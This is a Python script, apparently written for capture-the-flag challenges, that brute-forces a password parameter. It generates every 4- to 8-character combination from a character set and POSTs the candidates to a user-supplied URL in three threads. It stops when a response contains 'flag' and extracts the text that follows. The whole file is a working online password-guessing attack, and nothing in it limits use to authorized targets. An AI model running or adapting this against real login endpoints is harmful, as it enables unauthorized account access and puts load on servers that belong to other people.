#根据字符输入生成字典爆破,简单网页文本flag提取
# ! /usr/bin/env python3
import time
import re
try:
    from urllib import request
except ImportError:
    print("请先安装urllib库")
    print("Please install urllib library first,may be you can use command 'pip install urllib'.....")
    time.sleep(3)
    exit(0)
from urllib import parse
import urllib.error
try:
    import threading
except ImportError:
    print("请先安装threading库")
    print("Please install threading library first,may be you can use command 'pip install threading'.....")
    time.sleep(3)
    exit(0)
def outp():#
    print("欢迎使用此脚本！")
    print('Welcome!')
outp()
print('String Dictionary..')
s=input("字符串字典(不输入则为0-9，a-z):")
if not s:
    s='0123456789zxcvbnmasdfghjklqwertyuiop'
url=input("需要爆破的url:")
print('parameter  need to be POST..')
postcode=input("需要POST的参数名称:")
print('Enter the number of digits of the password to be cracked(At least four, up to eight)..')
times=int(input('输入需要爆破的密码的位数(至少四位,最多八位):'))
while times<4 or times>8:
    print('Please try it again..')
    times = int(input('请再次输入爆破密码位数(至少四位,最多八位):'))
datt=[]
for i in s:#修改这里！！！！！！！！！！！！！！！！！！！！！！
    for j in s:
        for k in s:
            for l in s:
                if times>4:
                    for m in s:
                        if times==5:
                            datt.append(i + j + k + l + m )
                        elif times>5:
                            for n in s:
                                if times==6:
                                    datt.append(i + j + k + l + m + n )
                                elif times>6:
                                    for a in s:
                                        if times==7:
                                            datt.append(i + j + k + l + m + n + a )
                                        elif times >7:
                                            for b in s:
                                                datt.append(i+j+k+l+m+n+a+b)
                else:
                    datt.append(i + j + k + l )

L1=[]
L2=[]
L3=[]
answer=[]
answer.append('Not Found!')
resultpack={}
for c in range(50):
    if not datt:
        break
    else:
        L1.append(datt.pop())
for d in range(70):
    if not datt:
        break
    else:
        L2.append(datt.pop())
while datt:
        L3.append(datt.pop())

#定义线程的类
class Exploitthread(threading.Thread):
    def __init__(self,datt,postcode,url,name):
        threading.Thread.__init__(self)
        self.datt=datt
        self.url=url
        self.postcode=postcode
        self.name=name
    def run(self):
        print("%s Thread Starting Exploit....."% self.name)
        len1=-1
        len2=-2
        clen=0
        while self.datt:
            x = self.datt.pop()
            dat = {postcode: x}
            data = bytes(parse.urlencode(dat), encoding='utf-8')
            try:
                response = request.urlopen(url, data=data)
            except:
                print('There must be something wrong!')
                print('Please try it later!')
                time.sleep(3)
                exit(0)
            result = response.read().decode('utf8')
            print(len(result),end=":")
            print(x)
            resultpack[x]=len(result)
            if result.find('flag') == -1:
                continue
            else:
                pattern = r'flag(.*)<'
                Final = re.findall(pattern, result)
                answer.pop()
                answer.append(Final.pop())
                break
        print('%s Thread Result:' % self.name)
        print(answer[0])
thread1=Exploitthread(datt=L1,postcode=postcode,url=url,name='First')
thread2=Exploitthread(datt=L2,postcode=postcode,url=url,name='Second')
thread3=Exploitthread(datt=L3,postcode=postcode,url=url,name='Third')
#开启线程进行爆破
thread1.start()
thread2.start()
thread3.start()
